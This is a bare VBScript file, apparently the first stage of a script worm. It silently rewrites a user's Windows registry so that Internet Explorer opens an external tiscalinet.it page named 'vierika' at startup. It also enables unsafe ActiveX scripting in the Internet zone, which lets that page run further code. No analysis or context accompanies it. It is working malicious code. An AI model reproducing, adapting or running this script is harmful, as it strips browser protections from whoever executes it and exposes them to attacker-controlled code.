On Error Resume Next
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://web.tiscalinet.it/krivojrog/vierika/Vindex.html"
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201", 0 , "REG_DWORD"
